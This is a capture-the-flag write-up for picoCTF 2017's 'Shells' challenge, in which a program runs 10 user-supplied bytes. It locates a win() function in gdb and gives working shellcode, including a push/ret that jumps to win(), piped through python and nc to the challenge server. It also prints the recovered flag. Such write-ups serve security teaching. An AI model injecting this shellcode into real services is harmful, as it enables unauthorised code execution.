# Shells

```
How much can a couple bytes do? Use shells! Source. Connect on shell2017.picoctf.com:58279.
HINTS
Read about basic shellcode
You don't need a full shell (yet...), just enough to get the flag
```

This is identical to shellz except that the program only reads 10 bytes and includes a win function that when called will give us a shell.

```C
void win(){
    system("/bin/cat ./flag.txt");
}
```

Let's find the address of the win function in gdb.

```
$ gdb shells -q
Reading symbols from shells...(no debugging symbols found)...done.
(gdb) p win
$1 = {<text variable, no debug info>} 0x8048540 <win>
(gdb)
```

So we need to execute an assembly instruction via the bytes that we enter to call or jump to a function at that location. We used the online assembly compiler from [https://defuse.ca/online-x86-assembler.htm](https://defuse.ca/online-x86-assembler.htm) for this purpose.

Our initial though was to simply execute a call instruction to the memory address of the win function. But it is important to note that the assembly call and jmp instructions are **relative.** They add to the line you are currently on the given argument and then execute the instructions at that new position. So neither of these worked.

```ASM
call 0x8048540
```
```ASM
jmp 0x8048540
```

We spent hours trying to figure out how to get it to call the right address. In the end we tried values until it lined up with the address we wanted to execute instructions at using the location of segfaults in memory, information we gained via the use of gdb. The result was 2 instructions that did work.

```ASM
jmp    0x1007253b
```
Which compiles to:
```
0:  e9 37 25 07 10          jmp    1007253c <_main+0x1007253c>
```
```ASM
call 0x1007253b
```
Which compiles to:
```
0:  e8 37 25 07 10          call   1007253c <_main+0x1007253c>
```

We injected the jmp instruction into the program using a python -c command, although we could also have used echo -e. The result below yields the flag.

```
$ (python -c "print '\xe9\x36\x25\x07\x10'"; cat) | nc shell2017.picoctf.com 58279
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
84f1e856de605076057b0687dfd0865f
```

While our original solution does work. It was tedious to derive and they gave use a full 10 bytes worth of instruction to accomplish our goal. Those familiar with assembly will note that it takes only 6 bytes to push to the stack and return to that address. We recommend this solution.

```ASM
push 0x8048540
ret
```

This compiles to the following shellcode.

```
0:  68 40 85 04 08          push   0x8048540
5:  c3                      ret 
```

As a string literal, it can be injected using the following python command. It yields the same result with only one extra byte. That byte is certainly worth the hours we spent not using it.

```
$ (python -c "print '\x68\x40\x85\x04\x08\xC3'"; cat) | nc shell2017.picoctf.com 58279
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
84f1e856de605076057b0687dfd0865f
```

As another note. There may be a way to do an absolute call instruction in x86 assembly but we did not explore it here because we were unable to get it to work. Message us if you find a solution involving such an instruction. We would love to hear about it.
